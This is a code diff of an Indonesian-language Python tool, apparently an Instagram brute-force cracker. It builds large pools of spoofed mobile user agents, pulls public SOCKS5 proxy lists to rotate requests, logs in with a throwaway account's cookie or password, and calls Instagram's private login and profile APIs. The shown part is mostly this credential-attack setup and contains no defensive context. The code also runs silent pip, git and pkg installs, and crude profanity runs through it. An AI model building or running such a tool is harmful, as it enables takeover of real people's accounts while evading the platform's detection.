@@ -1,70 +1,104 @@
-#BrayennnXD ComeBack
-#BrayennnXD Nih Bosss
-#Jangan Lupa Besyukur :)
-
-
+# coding:utf-8
+#/usr/bin/python
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
 try:
 	import json
 	import uuid
 	import hmac
+	import rich
 	import random
 	import hashlib
 	import urllib
 	import urllib.request
 	import calendar
 except ImportError as e:
-	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
+	exit(f'[!] {e} belum terinstall')
 import requests,bs4,json,os,sys,random,datetime,time,re
 try:
-	import rich
-except ImportError:
-	os.system('pip install rich')
-	time.sleep(1)
-	try:
-		import rich
-	except ImportError:
-		print(' tidak dapat menginstall module rich, coba install manual (pip install rich)')
+        import rich
+except ImportError as e:
+        print (f" {M}• {P}sedang install bahan {H}{e.name}, {P}mohon tunggu...")
+        os.system(f"python -m pip install {e.name} &> /dev/null")
+        os.system(f"python -m pip install requests &> /dev/null")
+try:
+        import pull
+except ImportError as e:
+        print (f" {M}• {P}sedang install bahan {H}{e.name}, {P}mohon tunggu...")
+        os.system(f"git pull")
+        os.system(f"pkg install play-audio")
+
+from rich import print as prints
+from rich.console import Console
+from rich.columns import Columns
+from rich.panel import Panel
+from rich.tree import Tree
+from rich.table import Table as me
 from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
 from rich.panel import Panel as nel
 from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
+from bs4 import BeautifulSoup as parser
 import time
 from rich.progress import track
-from rich.tree import Tree
-from rich import print as prints
-from rich import print as rprint
-from rich.table import Table as me
-
-###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
-from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
-from rich.console import Console
-from rich.table import Table
-from rich.columns import Columns
-console = Console()
-from concurrent.futures import ThreadPoolExecutor as Modol
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
+from rich.tree import Tree
+from rich import print as prints
+from rich.console import Console as sol
+from rich.panel import Panel as nel
+from rich import print as cetak
 
 day=datetime.now().strftime("%d-%b-%Y")
 nyMnD = 5
 nyMxD = 10
 current_GMT = time.gmtime(time.time())
+
 insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
-url='https://z-p42.www.instagram.com/'
-menudump=[]
-prox_xyaa=[]
+url='https://www.instagram.com'
+
+merah  = '[#FF0022]'
+hijau  = '[#00FF33]'
+hapus  = '[/]'
+bc = '[bold cyan]'
+kuning = '[#FFFF00]'
+kn = '[bold yellow]'
+hapus  = '[/]'
+biru_m = '[bold cyan]'
+
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+
+color_table = "#FFFFFF"
+color_rich = "[#00C8FF]"
+sys.stdout.write('\x1b]2; Insta Vindra XD\x07')
+
+try:os.mkdir('data')
+except:pass
+try:os.mkdir('result')
+except:pass
 
 CY='\033[96;1m'
-H='\33[32;1m' #HIJAU
-M='\033[1;31m' #MERAH
-K='\033[1;33m' #KUNING
-U='\033[1;35m' #UNGU
-O='\033[38;2;255;127;0;1m' #ORANGE
-C='\033[0m' #CLEAR
-N = '\x1b[0m' # WARNA MATI
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+
 Z2 = "[#000000]" # HITAM
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
@@ -76,236 +110,225 @@ O2 = "[#00FFFF]" # BIRU MUDA
 P2 = "[#FFFFFF]" # PUTIH
 J2 = "[#FF8F00]" # JINGGA
 A2 = "[#AAAAAA]" # ABU-ABU
-#WARNA rick(kotak)
-HH = "[#000000]" # Hitam
-MM = "[#FF0000]" # Merah
-II = "[#00FF00]" # Hijau
-KK = "[#FFFF00]" # Kuning
-BB = "[#00C8FF]" # Biru
-UU = "[#AF00FF]" # Ungu
-PP = "[#FF00FF]" # Pink
-CC = "[#00FFFF]" # Biru Muda
-QQ = "[#FFFFFF]" # Putih
-JJ = "[#FF8F00]" # Jingga
-AA = "[#AAAAAA]" # Abu-Abu
-OO = "[#FFA500]" # OREN
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+M3 = "[#d700d7]" # Magenta
+bc = '[bold cyan]'
+R2 = random.choice([M3, J2, H2, K2, O2, N2, M2, B2])
+
+a = "[#8700af]"
+b = "[#87875f]"
+c = "[#8787af]"
+d = "[#87afff]"
+e = "[#87ff00]"
+R3 = random.choice([a, b, c, d, e])
+
+USN = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 Instagram 32.0.0.14.97 (iPhone10,6; iOS 11_1_1; ru_UA; ru-UA; scale=3.00; gamut=wide; 1125x2436)"
+
+internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
+HARIS, HARIS1, method, ugen, ugen3, ugen2, baru, zx, prox, menudump, uazpepek = {}, {}, [], [], [], [], [], [], [], [], []
+s = requests.Session()
+UaNgentodMuach = []
+
+def uazku():
+    rr = random.randint
+    rc = random.choice
+    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
+    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
+    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
+    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
+    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
+    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
+    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
+    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
+    return uazku8
+
+for xc in range(1000):
+    rr = random.randint
+    rc = random.choice
+    uaz1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; zh-CN; Infinix X6511B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(2500,2900))}.{str(rr(75,150))} HiBrowser/2.5.016 UWS/ Mobile Safari/537.36"
+    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
+    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
+    uainsta = str(rc([uaz1, uaz2, uaz3]))
+    baru.append(uainsta)
+
+for aditya in range(10000):
+    rr = random.randint
+    rc = random.choice
+    uazku1 = f"Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (30/11; 360dpi; 720x1437; realme; RMX3231; RMX3231; RMX3231; it_IT; {str(rr(422222222,499999999))})"
+    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G960F Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (29/{str(rr(9,12))}; 540dpi; 1080x2058; samsung; SM-G960F; starlte; samsungexynos9810; it_IT; {str(rr(422222222,499999999))})"
+    uazku3 = f"Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.{str(rr(211111,299999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,140))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,90))}.{str(rr(111,199))} Android (30/11; 320dpi; 720x1368; HMD Global/Nokia; Nokia 3.2; DPL_sprout; qcom; it_IT; {str(rr(411111111,499999999))})"
+    uazstart = str(rc([uazku1, uazku2, uazku3]))
+    uazpepek.append(uazstart)
+
+for NazriXDGantengNgab in range(1000):
+   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
+   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
+   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
+   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+   chrome1 = rr(73,99)
+   chrome2 = rr(4500,4900)
+   chrome3 = rr(75,150)
+   chrome4 = rr(111111,199999)
+   buildhan = rc([
+                  "MMB29P",
+                  "MMB29K",
+                  "LRX22G",
+                  "LMY48B",
+                  "JZO54K",
+                  "KTU84P",
+                  "KOT49H",
+                  "JDQ39"])
+   deviceku = rc([
+                  "Lenovo TB-X104X",
+                  "SM-G930VC",
+                  "Nexus 6P",
+                  "SAMSUNG SM-T550",
+                  "HTC Legend 1.32.163.1",
+                  "HTC_TATTOO_A3288",
+                  "Nexus One",
+                  "LG-L1100",
+                  "SonyEricssonX10i",
+                  "SM-A510F",
+                  "SM-T560",
+                  "B3-A20",
+                  "XT720"])
+   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
+   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
+   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
+   adtyaUAmain = rc([ugent1,ugent2,ugent3])
+   UaNgentodMuach.append(adtyaUAmain)
+   
 
 try:
-	color_rich = open("data/color_rich.txt","r").read()
-except FileNotFoundError:
-	color_rich = "[#afafff]"
+    with requests.Session() as ses:
+        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
+        for xc in _url.splitlines():
+            prox.append(xc)
+except requests.exceptions.ConnectionError:
+    print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
+    time.sleep(0.3)
+    exit()
+
 try:
-	color_table = open("data/color_table.txt","r").read()
-except FileNotFoundError:
-	color_table = "#afafff"
+	with requests.Session() as ses:
+	      url = ses.get("http://ip-api.com/json/").json()
+	      IP  = url["query"]
+	      CN = url["country"]
+	      RN = url["regionName"]
+	      AS = url["as"]
+	      TZ = url["timezone"]
+	      CC = url["countryCode"]
+except KeyError:
+	IP = "-"
+	CN = "-"
+	RN = "-"
+	AS = "-"
+	CC = "-"
 
-def change_theme():
-	prints(Panel(f"""{P2}[{color_rich}01{P2}]. change theme color red    [{color_rich}06{P2}]. change theme color pink
-[{color_rich}02{P2}]. change theme color green  [{color_rich}07{P2}]. change theme color L blue
-[{color_rich}03{P2}]. change theme color yellow [{color_rich}08{P2}]. change theme color white
-[{color_rich}04{P2}]. change theme color blue   [{color_rich}09{P2}]. change theme color orange
-[{color_rich}05{P2}]. change theme color violet [{color_rich}10{P2}]. change theme color gray""",width=80,padding=(0,4),style=f"{color_table}"))
-	them = input(f" {N}choose theme : ")
-	if them in["1","01"]:
-		open("data/color_rich.txt","w").write("[#FF0000]")
-		open("data/color_table.txt","w").write("#FF0000")
-	elif them in["2","02"]:
-		open("data/color_rich.txt","w").write("[#00FF00]")
-		open("data/color_table.txt","w").write("#00FF00")
-	elif them in["3","03"]:
-		open("data/color_rich.txt","w").write("[#FFFF00]")
-		open("data/color_table.txt","w").write("#FFFF00")
-	elif them in["4","04"]:
-		open("data/color_rich.txt","w").write("[#00C8FF]")
-		open("data/color_table.txt","w").write("#00C8FF")
-	elif them in["5","05"]:
-		open("data/color_rich.txt","w").write("[#AF00FF]")
-		open("data/color_table.txt","w").write("#AF00FF")
-	elif them in["6","06"]:
-		open("data/color_rich.txt","w").write("[#FF00FF]")
-		open("data/color_table.txt","w").write("#FF00FF")
-	elif them in["7","07"]:
-		open("data/color_rich.txt","w").write("[#00FFFF]")
-		open("data/color_table.txt","w").write("#00FFFF")
-	elif them in["8","08"]:
-		open("data/color_rich.txt","w").write("[#FFFFFF]")
-		open("data/color_table.txt","w").write("#FFFFFF")
-	elif them in["9","09"]:
-		open("data/color_rich.txt","w").write("[#FF8F00]")
-		open("data/color_table.txt","w").write("#FF8F00")
-	elif them in["10"]:
-		open("data/color_rich.txt","w").write("[#AAAAAA]")
-		open("data/color_table.txt","w").write("#AAAAAA")
-	time.sleep(2)
-	prints(Panel("[white]berhasil mengganti tema, silahkan jalankan ulang scriptnya python run.py",style=f"{color_table}"));time.sleep(2);exit()
+def clear():
+	try:os.system('clear')
+	except:pass
 
-USN="Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 Instagram 24.0.0.12.201 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-G930F; herolte; samsungexynos8890; pt_PT)"
-USN="Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A3003 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 92.0.0.15.114 Android (26/8.0.0; 420dpi; 1080x1920; OnePlus; ONEPLUS A3003; OnePlus3T; qcom; de_DE; 153386780)"
-USN="Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro Build/SQ3A.220705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 Instagram 244.0.0.17.110 Android (32/12; 560dpi; 1440x2934; Google/google; Pixel 6 Pro; raven; raven; en_AU; 383877306)"
-
-internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
-method=[]
-s=requests.Session()
-uaxz=[]
-xxkontol=[]
-axz=[]
-oppo=[]
-for tu in range(1000):
-            a = random.choice([
-            'CPH1853',
-            'CPH1803',
-            'CPH1893',
-            'CPH2071',
-            'CPH1717',
-            'CPH1937',
-            'CPH1923',
-            'CPH1725',
-            'CPH1909',
-            'CPH1613',
-            'CPH1989',
-            'CPH1907',
-            'CPH2015',
-            'CPH2083'])
-            b = random.randrange(73, 99)
-            c = random.randrange(4200, 4900)
-            d = random.randrange(40, 150)
-            e = random.choice([
-            'my-zg',
-            'en-us',
-            'en-gb',
-            'en-au',
-            'th-th',
-            'hi-in',
-            'zh-tw',
-            'in-id',
-            'ru-ru',
-            'vi-vn',
-            'zh-cn'])
-            f = random.choice([
-            '9',
-            '10',
-            '11',
-            '12',
-            '5.1',
-            '4.4.4',
-            '8.1.0',
-            '7.1.1',
-            '6.0.1',
-            '5.1.1'])
-            g = random.randrange(4,99)
-            h = random.randrange(3,10)
-            i = random.randrange(111111,199999)
-            j = random.randrange(1,9)
-            ugens_xyaa = f'Mozilla/5.0 (Linux; U; Android {f}; {e}; {a} SM-G965N Build/QP1A.190711.020; {i}.0{j}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 OppoBrowser/{g}.{h}.1.{h}'
-            oppo.append(ugens_xyaa)
-try:
-    proxs_xyaa = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all").text
-    for xc_team in proxs_xyaa.splitlines():prox_xyaa.append(xc_team)
-except:prints(Panel(f'{P2}Sinyal Lu lag Tod Kalo Dah Bagus coba lagi masuk ke tools',width=80,style=f"{color_table}"));exit()
+def RemoveCookie():
+    try:os.remove("data/cookie.txt")
+    except:pass
+    try:os.remove("data/user.txt")
+    except:pass
 
 def waktu():
 	now = datetime.now()
 	hours = now.hour
-	if 4 <= hours < 12:timenow = "selamat pagi"
-	elif 12 <= hours < 15:timenow = "selamat siang"
-	elif 15 <= hours < 18:timenow = "selamat sore"
-	else:timenow = "selamat malam"
+	if 4 <= hours < 12:timenow = "Good Morning"
+	elif 12 <= hours < 15:timenow = "Good Afternoon"
+	elif 15 <= hours < 18:timenow = "Good Evening"
+	else:timenow = "Good Night"
 	return timenow
 
 def jalan(keliling):
 	for mau in keliling + '\n':
 		sys.stdout.write(mau)
-		sys.stdout.flush();sleep(0.03)
-		
-warnaa = random.choice([M,H,K,U,O])
-kontolwarna = random.choice([M,H,K,U,O])
-wr = random.choice([M,K,H,U,O])
-kontol_rich = random.choice([K2,M2,H2,U2,B2,O2,J2])
+		sys.stdout.flush();sleep(0.03) 
 
-# BANNER
-def banner():
-	os.system("clear")
-	prints(Panel(f"{P2}\tSELAMAT DATANG DI TOLS {color_rich}'Instagram'{P2} MULTI BRUTE FORCE IG",width=80,padding=(0,4),style=f"{color_table}"))
-	prints(Panel(f'''{O2}                     " PREMIUM | Hanzzz"{color_rich}
-_____ _____________  ____________________ {H2}•{P2} Author  : Hana X Ganss {color_rich}
-__  // /__  /___   |/  /__  __ )__  ____/ {H2}•{P2} Facebook: Malezz Isi {color_rich}
-_  // /__  / __  /|_/ /__  __  |_  /_     {H2}•{P2} Status  : {H2}Prem{color_rich}
-/__  __/  /___  /  / / _  /_/ /_  __/     {H2}•{P2} Whatsap : 085786215554{color_rich}
-  /_/  /_____/_/  /_/  /_____/ /_/        {H2}•{P2} Version : 1.0 ''',width=80,padding=(0,2),style=f"{color_table}"))
+def Banner___Gua__Ngab():
+	try:clear()
+	except:pass
+	try:os.popen('play-audio data/sound/play.mp3')
+	except:pass
+	prints(Panel(f"""
 
-def process_data():
-    sleep(0.08)
-    	
+╦╔═╗   ╔═╗╦═╗╔═╗╔═╗╦╔═   script: BrayennnXD
+║║ ╦───║  ╠╦╝╠═╣║  ╠╩╗   gatausiapa: Vindra XD
+╩╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩   github: github.com/Dra-ID
+
+""",subtitle=f"Good Night",title=f"{B2}{waktu()}",width=70,padding=(0,4),style=f"#FFFFFF"))
+
+def loading():
+    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
+    for i in range(50):
+        time.sleep(0.1)
+        sys.stdout.write(f"\r{P}[{M}!{P}] convert cookie... " + animation[i % len(animation)] +"\x1b[0m ")
+        sys.stdout.flush()
+    print("")		
+
 try:
     # python 2
 	urllib_quote_plus = urllib.quote
 except:
     # python 3
 	urllib_quote_plus = urllib.parse.quote_plus
- 
 
 def cekAPI(cookie):
-    user=open('data/.username','r').read()
+    user=open('data/user.txt','r').read()
+    coki = open('data/cookie.txt','r').read()
     try:
-        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
+        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
         i=c.json()["data"]["user"]
         nama=i["full_name"]
         followers=i["edge_followed_by"]["count"]
         following=i["edge_follow"]["count"]
         external.append(f'{nama}|{followers}|{following}')
+    except FileNotFoundError:
+    	os.remove('data/cookie.txt')
+    	os.remove('data/user.txt')
     except  (ValueError,KeyError):
-        prints(Panel(f"{P2}Akun Lu Cp Kontol, Login Pake Akun Larn.",width=80,style=f"{color_table}"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
+        print(f"{P}[{B}+{P}] instagram checkpoint")
+        os.remove('data/cookie.txt')
+        os.remove('data/user.txt')
+        exit()
 
     return external,user
 
-def login_kamu():
-    if "sukses" in lisensiku:
+def ggwp17():
         try:
-            kuki=open('data/.kukis.log','r').read()
+            kuki=open('data/cookie.txt','r').read()
         except FileNotFoundError:
-            banner()
-            prints(Panel(f"{P2}disarankan login menggunakan cookie agar terhindar dari checkpoint akun",width=80,padding=(0,2),style=f"{color_table}"))
-            prints(Panel(f"{P2}[{color_rich}1{P2}]. login menggunakan cookie ( {H2}disarankan{P2} )\n{P2}[{color_rich}2{P2}]. login menggunakan username & password\n{P2}[{color_rich}3{P2}]. keluar ( {M2}tools {P2})",width=80,padding=(0,4),style=f"{color_table}"))
-            loginpil=input(f"input 1 sampai 3 : ")
-            if loginpil=='':prints(Panel(f"{P2}jangan kosong broo!!! pilih salah satu yang di atas",width=80,padding=(0,4),style=f"{color_table}"));exit()
-            if loginpil=='1':
-                prints(Panel(f"{P2}sebelum login pastikan akun tumbal bersifat publik dan bukan private",width=80,padding=(0,4),style=f"{color_table}"))
-                us=input(f'masukan username Lu : ')
-                cok=input(f'masukan cookie   : ')
-                for _ in track(range(100), description=f'{P2}tunggu sedang login...'):process_data()
-                kuki=open('data/.kukis.log','w').write(cok)
-                user=open('data/.username','w').write(us)
-                prints(Panel(f"{P2}login akun tumbal berhasil, silahkan jalankan ulang scriptnya",width=80,padding=(0,7),style=f"{color_table}"));exit()
-            elif loginpil == '2':
-                login()
-            elif loginpil == '3':
-                prints(Panel(f"{P2}terima kasih telah menggunakan script ini {color_rich}'InstaXC'{P2} semoga hari² kamu menyenangkan",width=80,padding=(0,3),style=f"{color_table}"));time.sleep(2);exit()
+            Banner___Gua__Ngab()
+            prints(Panel(f"login menggunakan cookie, disarankan tidak menggunakan akun pribadi anda",width=80,padding=(0,2),style=f"#FFFFFF"))
+            coki = input(f"{P}[{B}?{P}] masukan cookie : {H}")
+            loading()
+            try:
+                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
+                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
+                xx = json.loads(po.text)['user']
+                useri = xx["username"]
+                user = open('data/user.txt','w').write(useri)
+                kuki = open('data/cookie.txt','w').write(coki)
+                jalan(f'{P}[{H}✓{P}] selamat datang {H}{useri}{P} cookie kamu valid')
+                time.sleep(0.05)
+                os.popen('play-audio data/sound/message.mp3')
+                prints(Panel(f"{H2}tolong gunakan script ini dengan bijak ya :)\natas apapun yang terjadi admin tidak bertanggung jawab.",title=f"{M2}• {K2}• {H2}•{P2} INFORMASI {H2}• {K2}• {M2}•",width=80,padding=(0,9),style=f"#FFFFFF"))
+                time.sleep(3)
+            except (json.decoder.JSONDecodeError, KeyError, AttributeError):
+                jalan(f"{P}[{M}X{P}] cookie invalid silahkan masukan cookie lainnya")
+                time.sleep(3)
+                RemoveCookie()
+                exit()
+            except ConnectionAbortedError:
+                print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
+                time.sleep(3)
+                exit()
         ex,user=cekAPI(kuki)
         cookie={'cookie':kuki}
         instagram(ex,user,cookie).menu()
-    else:
-        lisensi()
-def login():
-	global external
-	try:
-		prints(Panel(f"{P2}sebelum login pastikan akun tumbal bersifat publik dan bukan private",width=80,padding=(0,4),style=f"{color_table}"))
-		us=input(f' masukan username : ')
-		pw=input(f' masukan password : ')
-	except KeyboardInterrupt:
-		print(f' keyboardinterrupt terdeteksi... keluar !')
-		exit()
-	x=instagramAPI(us,pw).loginAPI()
-	if x.get('status')=='success':
-		open('data/.username','a').write(us)
-		open('data/.kukis.log','a').write(x.get('cookie'))
-		cookie={'cookie':x.get('cookie')}
-		prints(Panel(f"{P2}login akun tumbal berhasil, silahkan jalankan ulang scriptnya",width=80,padding=(0,7),style=f"{color_table}"));exit()
-	elif x.get('status')=='checkpoint':
-		prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"{color_table}"));os.system("rm -rf data/.kukis.log rm -rf data/.username");exit()
-	else:
-		prints(Panel(f"{P2}Username atau pw lu salah todi",width=80,padding=(0,1),style=f"{color_table}"))
-		time.sleep(2);exit()
 
 def User_Agent():
 	dpi_phone = [
@@ -377,7 +400,7 @@ def user_agentAPI():
 	return USER_AGENT_BASE
 
 class instagramAPI:
-	API_URL = 'https://z-p42.www.instagram.com/api/v1/'
+	API_URL = 'https://i.instagram.com/api/v1/'
 	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
 		'model': 'HM 1SW',
 		'android_version': 18,
@@ -410,7 +433,7 @@ class instagramAPI:
 			return generated_uuid.replace('-', '')
 
 	def loginAPI(self):
-		token=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":User_Agent()}).text
+		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
 		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
 		self.s.headers.update({'Connection': 'close',
 			'Accept': '*/*',
@@ -430,14 +453,14 @@ class instagramAPI:
 			self.generateUUID(False),
 			urllib.request.quote(self.data)
 		)
-		x=self.s.post("https://z-p42.www.instagram.com/api/v1/accounts/login/", self.payload)
+		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
 		x_jason=json.loads(x.text)
 		x_kukis=x.cookies.get_dict()
 		if "logged_in_user" in x.text:
 			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
-			id=x_jason['logged_in_user']['pk']
-			nm=x_jason['logged_in_user']['full_name']
